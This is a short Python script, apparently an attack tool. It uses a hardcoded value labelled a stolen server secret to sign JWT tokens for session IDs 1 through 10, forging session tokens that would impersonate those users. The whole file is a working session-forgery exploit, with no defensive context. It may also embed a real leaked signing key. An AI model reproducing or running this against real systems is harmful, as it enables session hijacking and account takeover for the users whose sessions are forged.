import jwt
from typing import Generator

STOLEN_SERVER_SECRET = "G5KG6mPJbnplhdGDvg0xsp83WKa17t9zhlkUMhqsXoWbz3AibS"

def predict_session_tokens(id_generator: Generator) -> Generator[str, str, str]:
  for x in id_generator:
    session_construction = {"session_id": x}
    secret_session_id: str = jwt.encode(
      session_construction,
      STOLEN_SERVER_SECRET,
      algorithm="HS256"
    )
    yield secret_session_id

def main():
  target_range = range(1,11)
  session_id_generator = predict_session_tokens(target_range)
  for i, session_secret in zip(target_range, session_id_generator):
    print(f"{i}: {session_secret}")

if __name__ == "__main__":
  main()